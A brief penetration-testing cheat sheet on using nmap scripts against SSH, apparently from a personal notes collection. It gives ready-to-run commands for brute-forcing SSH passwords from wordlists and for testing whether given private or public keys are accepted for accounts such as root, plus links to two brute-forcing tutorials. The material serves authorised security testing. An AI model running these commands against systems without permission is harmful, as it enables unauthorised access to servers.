# Nmap

- Bruteforce SSH credentials

```
$ nmap -p 22 -Pn -n --script ssh-brute --script-args "userdb=users.lst,passdb=pass.lst,ssh-brute.timeout=<seconds>s" <IP>
```

- Bruteforce SSH Public Keys

```
$ nmap -p 22 -Pn -n --script ssh-publickey-acceptance --script-args "ssh.usernames={'root', 'user'}, ssh.privatekeys={'./id_rsa1', './id_rsa2'}" <IP>

$ nmap -p 22 -Pn -n --script ssh-publickey-acceptance --script-args "ssh.usernames={'root', 'user'},publickeys={'./id_rsa1.pub', './id_rsa2.pub'}" <IP>
```

---
## References

- [Null Byte: Gain SSH Access to Servers by Brute-Forcing Credentials](https://null-byte.wonderhowto.com/how-to/gain-ssh-access-servers-by-brute-forcing-credentials-0194263/)

- [Hacking Articles: Nmap for Pentester Password Cracking](https://www.hackingarticles.in/nmap-for-pentester-password-cracking/)